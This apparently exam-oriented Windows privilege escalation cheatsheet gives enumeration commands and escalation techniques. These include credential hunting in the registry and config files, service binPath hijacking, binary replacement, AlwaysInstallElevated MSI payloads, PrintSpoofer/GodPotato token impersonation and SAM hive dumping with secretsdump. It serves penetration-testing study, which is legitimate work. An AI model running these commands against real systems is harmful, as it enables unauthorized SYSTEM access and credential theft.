    10.10 Windows Privilege Escalation Cheatsheet

    Starting with a Windows shell?

    Identify your token, host and effective permissions.

    Start the first checks →
    Found a service candidate?

    Validate service control, the executed object and the available trigger.

    Follow the finding →

    ← Cheatsheet index | Full procedure | Credential use | Strategy map | Study methods: Escalate privileges on Windows

    TOKEN → CONTROLLED INPUT → EFFECTIVE RIGHT → PRIVILEGED CONSUMER → RUN-AS → TRIGGER → VERIFIED EFFECT

    10.10.1 Find escalation candidates with an initial tool-assisted survey Early tool-assisted pass

    Use a reviewed, transferred build in the current host context. Save output and select a concrete finding; a highlight is not the elevated identity.

    whoami /all
winPEASx64.exe log

    Tool-to-finding workflow.

    10.10.2 Establish your Windows identity, token and host context Token and host baseline

     
    hostname
whoami /all
systeminfo
ipconfig /all
route print
netstat -ano
tasklist /svc
query user
net user
net localgroup Administrators
driverquery /v

    Get-ComputerInfo | Select WindowsProductName,WindowsVersion,OsBuildNumber,OsArchitecture
Get-HotFix | Sort InstalledOn -Descending
Get-CimInstance Win32_Process | Select ProcessId,Name,ExecutablePath,CommandLine
Get-CimInstance Win32_Service | Select Name,StartName,State,StartMode,PathName
Get-CimInstance Win32_SystemDriver | Select Name,State,StartMode,PathName

    Record integrity level, enabled/deny-only groups and enabled/present privileges. Medium-integrity Administrators membership is not a high-integrity process. Prefer CIM; WMIC may be absent. Get-HotFix is not a complete update inventory.

    10.10.3 Verify what you can modify with your current token Effective ACLs

     
    icacls "C:\Path\To\OBJECT"
sc.exe sdshow SERVICE
accesschk.exe -accepteula -nobanner -v -w "USER" "C:\Path\To\OBJECT"
accesschk.exe -accepteula -nobanner -v -w -c "USER" SERVICE

    F full · M modify · RX read/execute · R read · W write · D delete · I inherited · OI object inherit · CI container inherit.

    File, directory, registry, service and task ACLs are distinct. Check the exact object/right and current enabled SID. MIC can still block write-up.

    10.10.4 Find usable credentials in accessible Windows artifacts Credentials and artifacts

     
    cmdkey /list
vaultcmd /list
vaultcmd /listcreds:"Windows Credentials" /all
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
dir /s /b C:\Windows\Panther\*unattend*.xml C:\Windows\System32\Sysprep\*.xml 2>nul
dir /s /b C:\Users\*.kdbx C:\Users\*.rdp C:\Users\id_rsa C:\Users\*.ppk 2>nul

    Get-Content -LiteralPath (Get-PSReadLineOption).HistorySavePath -ErrorAction SilentlyContinue
Get-ChildItem C:\inetpub,C:\ProgramData,C:\Users -Recurse -File -ErrorAction SilentlyContinue |
  Where-Object { $_.Extension -in '.config','.xml','.ini','.txt','.ps1','.bat','.cmd','.yml','.yaml','.json' } |
  Select-String 'password|passwd|secret|token|connectionString|user id=' -CaseSensitive:$false

    cmdkey proves a target-bound stored entry, not plaintext. DPAPI artifacts need the protecting user/machine context. Classify identity/type/scope before reuse.

    10.10.5 Check whether you control a privileged service or its executable Services

    Run/context: in the current Windows foothold, using its effective token; service names and paths refer to this host. Decide: a modifiable file is useful only if a privileged service actually consumes it and a trigger is available. Validate effective ACLs; a path-with-spaces lead belongs to unquoted service paths, not an assumed service-configuration right.

    Get-CimInstance Win32_Service | Select Name,StartName,State,StartMode,PathName

    sc.exe qc SERVICE
sc.exe sdshow SERVICE
icacls "C:\Path\To\service.exe"
icacls "C:\Path\To"
accesschk.exe -accepteula -nobanner -v -w -c "USER" SERVICE

    Need control + higher SERVICE_START_NAME + trigger. SERVICE_CHANGE_CONFIG, start and stop are separate rights. Use sc.exe in PowerShell; bare sc may be Set-Content.

    10.10.5.1 Change service path and restore 
    sc.exe qc SERVICE
sc.exe config SERVICE binPath= "C:\Windows\Temp\PAYLOAD_EXE"
sc.exe stop SERVICE
sc.exe start SERVICE
sc.exe config SERVICE binPath= "ORIGINAL_BINARY_PATH"

    Space after binPath= is required. Error 1053 may still follow payload execution; verify effect and restore.

    10.10.5.2 Replace writable binary 
    copy /Y "C:\Path\To\service.exe" "C:\Windows\Temp\service.exe.backup"
copy /Y "C:\Windows\Temp\PAYLOAD_EXE" "C:\Path\To\service.exe"
sc.exe stop SERVICE
sc.exe start SERVICE

    Check parent delete/create rights, file locks, architecture and recovery.

    10.10.6 Check whether an unquoted service path reaches a location you can write Unquoted service paths

    Verify the selected service identity, effective control and required trigger; reachability alone is insufficient.     
    Get-CimInstance Win32_Service |
  Where-Object { $_.PathName -match '\s' -and $_.PathName -notmatch '^\s*"' } |
  Select Name,StartName,State,StartMode,PathName

    icacls C:\
icacls "C:\Program Files"
icacls "C:\Program Files\Vendor App"
sc.exe qc SERVICE

    For C:\Program Files\Vendor App\svc.exe, prove an earlier missing prefix such as C:\Program.exe or C:\Program Files\Vendor.exe is creatable, service runs higher and trigger exists.

    10.10.7 Check whether privileged software loads a file you control DLL/helper search

     
    icacls "C:\Path\To\Application"
sc.exe qc SERVICE
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs"

    Need observed exact DLL request/load, selected writable searched directory, bitness/exports, privileged process and trigger. Account for redirection, API sets, SxS, loaded modules, KnownDLLs and application search flags. Procmon CreateFile + .dll + NAME NOT FOUND is useful when available.

    10.10.8 Find privileged tasks or startup consumers you can influence Scheduled tasks and startup consumers

    Check the privileged consumer, controlled input and actual schedule or trigger.     
    schtasks /query /fo LIST /v
schtasks /query /tn "\FOLDER\TASK" /xml
icacls "C:\Path\To\task-script.ps1"
icacls "C:\Path\To"
schtasks /run /tn "\FOLDER\TASK"

    Get-ScheduledTask | ForEach-Object {
  $t=$_
  [pscustomobject]@{Task="$($t.TaskPath)$($t.TaskName)";User=$t.Principal.UserId;RunLevel=$t.Principal.RunLevel;Actions=($t.Actions|Out-String).Trim()}
}

    reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
dir "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"

    Need writable consumed action/file plus higher principal and reliable trigger. Highest is relative to the task principal. /run accepted is not execution proof.

    10.10.9 Check installer policy and the elevation limits of your token AlwaysInstallElevated and UAC

     
    reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
msiexec.exe /quiet /qn /i C:\Path\To\PAYLOAD.msi

    Run only if both values are 0x1.

    whoami /groups
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin

    UAC bypass normally raises an already-admin filtered token; it is not ordinary standard-user escalation.

    10.10.10 Check whether your token privileges support an escalation route Token privileges

     
    whoami /priv
    PrivilegeDo not proceed until
    SeImpersonatePrivilegePrivileged auth trigger, build/arch/runtime and tool match
    SeAssignPrimaryTokenPrivilegeUseful token and process-creation requirements match

    10.10.10.1 Impersonation variants 
    PrintSpoofer64.exe -i -c "cmd.exe"
GodPotato-NET4.exe -cmd "cmd.exe /c whoami > C:\Windows\Temp\token-proof.txt"

    Pick by actual prerequisite, not “Potato” name. Verify a SYSTEM process/effect with whoami /all.

    10.10.10.2 Backup privilege to local hashes 
    reg save HKLM\SAM C:\Windows\Temp\SAM.hive
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM.hive

    impacket-secretsdump -sam SAM.hive -system SYSTEM.hive LOCAL

    Matched hives produce local credential material, not automatic SYSTEM or remote authorization.

    10.10.11 Assess software and driver candidates against the exact host build Software, drivers and kernel

    Use a matching affected build/configuration only after stronger permission-backed candidates have been assessed.     
    Get-ItemProperty 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*',
                 'HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*' -ErrorAction SilentlyContinue |
  Select DisplayName,DisplayVersion,Publisher,InstallLocation

    systeminfo
driverquery /v

    Order: deterministic config/credential → exact privileged app → exact driver → kernel last. Validate build, cumulative update, architecture, component/config, exploit source and stability. Avoid Win32_Product.

    10.10.16 Discover and recognize candidates

    Use these discovery checks to find a candidate, then validate the missing conditions. Cues are illustrative; complete synthetic outputs and three-outcome examples are in the linked study entries.

    10.10.16.1 Escalate privileges on Windows

    10.10.16.1.1 Find: Establish Windows token, host and process context

    At a new foothold inspect the complete token and host/service inventory before classifying the session as an administrator.

    whoami /all
systeminfo
tasklist /svc

    Recognize: An Administrators SID exists but this effective process is filtered/medium-integrity.

    Validate next: Check actual enabled privileges and object operations in the process that will perform the action.

    Establish Windows token, host and process context.

    10.10.16.1.2 Commands and use-case variants

    Need: A verified Windows foothold with a known token, integrity level and groups. A functioning command channel and the actual effective token/process context

    hostname
whoami /all
systeminfo
ipconfig /all
route print
netstat -ano
tasklist /svc
query user
net user
net localgroup Administrators
driverquery /v

    Get-ComputerInfo | Select-Object WindowsProductName,WindowsVersion,OsBuildNumber,OsArchitecture
Get-HotFix | Sort-Object InstalledOn -Descending
Get-CimInstance Win32_Process | Select-Object ProcessId,Name,ExecutablePath,CommandLine
Get-CimInstance Win32_Service | Select-Object Name,StartName,State,StartMode,PathName
Get-CimInstance Win32_SystemDriver | Select-Object Name,State,StartMode,PathName
Get-LocalUser
Get-LocalGroupMember Administrators

    Interpret: record user SID, integrity label, enabled/deny-only groups and present/enabled privileges. Administrator membership with Medium integrity is a filtered token, not a high-integrity process. Get-HotFix does not list every update; use build/KB output only to form a version hypothesis.

    10.10.16.1.3 WMIC compatibility fallbacks 
    wmic qfe get HotFixID,InstalledOn
wmic service get Name,StartName,State,StartMode,PathName
wmic process get ProcessId,Name,ExecutablePath,CommandLine

    WMIC is deprecated and may be absent on newer systems; PowerShell CIM is the baseline.

    whoami /all
hostname
ipconfig /all

    After a higher token, re-enumerate protected credentials, services, tasks, sessions, listeners, routes and domain context. Preserve the command, relevant output, trigger and restoration step. For exam use, recheck the current OffSec guide: Windows full-privilege evidence requires SYSTEM, Administrator or an account with Administrator privileges, and AI/LLM use is prohibited during the exam and report phase.

    Verify: Verify represented user/SID, enabled group/privilege state and actual privileged operation.

    If it fails: A prompt title or account name is insufficient. WMIC may be absent; use the documented CIM/PowerShell alternatives.

    10.10.16.1.4 Find: Prove effective file, registry and service-object permissions

    Take a real service/task/application path from inventory, then inspect its file, parent and separate service-object permissions.

    icacls "C:\Path\To\OBJECT"
icacls "C:\Path\To"
sc.exe sdshow SERVICE

    Recognize: A modifiable parent can differ from a read-only file; service configuration rights are another control plane.

    Validate next: Use icacls/Get-Acl on the reported object and parents. For a service also inspect sc qc/sc sdshow; for a task inspect its action/principal. Check the specific write/replace/configuration operation and its trigger.

    Prove effective file, registry and service-object permissions.

    10.10.16.1.5 Find: Recover Windows application, history and stored-credential artifacts

    Follow actual application/configuration paths, PSReadLine history and saved-credential targets under the current readable user context.

    cmdkey /list
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName

    Recognize: A target-bound saved credential is a possible consumer capability, not a plaintext password.

    Validate next: Establish protecting user/context, intended logon type and an actually permitted saved-credential or decryption route.

    Recover Windows application, history and stored-credential artifacts.

    10.10.16.2 Additional conditional surfaces

    Open a branch only when its observation and prerequisites match. Discovery-only entries retain their missing-action boundary.

    10.10.16.2.1 Inspect host-side RDP enablement and logon policy

    • Enter: you have authorized local administrative or equivalent management access to a Windows destination, and RDP access is relevant or failing.
    • Discover: inspect TermService, fDenyTSConnections, configured PortNumber, qwinsta listener state and the actual source-to-port path.
    • Validate: inspect NLA/security-layer policy, applied GPO, local Remote Desktop Users membership, and the effective SeRemoteInteractiveLogonRight / SeDenyRemoteInteractiveLogonRight assignments. Deny overrides allow.
    • Execute: RDP host-side inspection; then use the RDP access procedure only when its conditions are satisfied.
    • Verify: a usable desktop followed by whoami, hostname and ipconfig establishes the new host/identity/source position. Authentication-only success is not an interactive session.
    • Outcomes: listener/right/client conditions satisfied → remote operation preflight then session verification; decisive deny/no listener → ruled out here; policy, SID expansion or filtering unresolved → inconclusive.
    10.10.16.2.2 Documented commands and conditions

    Use this read-only sequence after obtaining an authorized local administrative session on the destination, or when the exercise explicitly supplies equivalent remote-management access. It answers four different questions: is RDP enabled, is a listener actually present, what security layer/NLA policy applies, and does the candidate identity have an effective remote-interactive logon right? Do not change registry values or policy merely to make a credential work.

    10.10.16.2.2.1 Listener, service and configured port
    Get-Service TermService
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber
qwinsta

    netstat -ano | findstr LISTENING | findstr ":3389"

    Read: fDenyTSConnections = 0 permits RDP at the local setting; 1 denies new RDP connections. PortNumber is displayed as a registry DWORD, commonly hexadecimal 0xD3D for 3389. A running TermService plus an RDP-Tcp listener in qwinsta and a listening socket establishes host-side listener state. A missing :3389 socket is not decisive if PortNumber is nondefault. Policy can override the local value, so inspect resultant policy before treating this as effective configuration.

    10.10.16.2.2.2 NLA, transport security and policy precedence
    reg query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v MinEncryptionLevel

reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v fDenyTSConnections
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v UserAuthentication
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v SecurityLayer

    gpresult /scope computer /v

    Read: UserAuthentication = 1 requires Network Level Authentication. For SecurityLayer, 0 is native RDP security, 1 negotiates, and 2 requires TLS. MinEncryptionLevel further constrains client compatibility. A missing policy value means “not configured at this policy path,” not that the feature is absent. Use gpresult to identify the winning computer policy when local and policy-backed values conflict or revert after refresh. These settings explain negotiation failures; they do not grant a user logon rights.

    10.10.16.2.2.3 Candidate membership and effective logon rights
    net localgroup "Remote Desktop Users"
whoami /groups

    From an elevated PowerShell or Command Prompt, export the currently applied user-right assignments and inspect only the RDP entries:

    $policy = Join-Path $env:TEMP 'rdp-user-rights.inf'
secedit /export /mergedpolicy /areas user_rights /cfg $policy /quiet
Select-String -Path $policy -Pattern '^SeRemoteInteractiveLogonRight','^SeDenyRemoteInteractiveLogonRight'

    Read: the candidate must be covered by SeRemoteInteractiveLogonRight; membership in local Administrators or Remote Desktop Users commonly supplies that right, but the actual applied policy is decisive. SeDenyRemoteInteractiveLogonRight overrides the allow right. Exported entries can be names or SIDs, so resolve unfamiliar SIDs before deciding. whoami /groups proves only the current process token; use it for the candidate only when you are actually running in that candidate's context. A group listing alone does not prove an effective right when domain policy or nested membership changes the result.

    10.10.16.2.2.4 Source-relative validation and decision
    nmap -Pn -n -p 3389 --reason TARGET
xfreerdp3 /v:TARGET /u:USER /d:DOMAIN /auth-only /cert:ignore

    Ready for an interactive attempt: the actual source reaches the configured RDP port; the listener is enabled; the client can meet the NLA/security requirements; the credential is accepted in the intended local/domain context; and the identity has the effective allow right without an applicable deny right. Ruled out in this context: a decisive required condition is absent, such as an effective deny assignment or no listener on the configured port. Inconclusive: access to policy data is denied, group/SID expansion is unresolved, GPO precedence is unclear, or network filtering prevents source-relative validation. Do not turn an inconclusive result into “bad password” or “RDP disabled.”

    Security baseline: on a normally secured host, RDP may be disabled when not needed; when enabled, NLA is normally retained, access is limited to intended administrative/remote-user principals, deny assignments override broad membership, and the firewall limits exposure. The state machine records deviations and capabilities; it does not recommend weakening these controls.
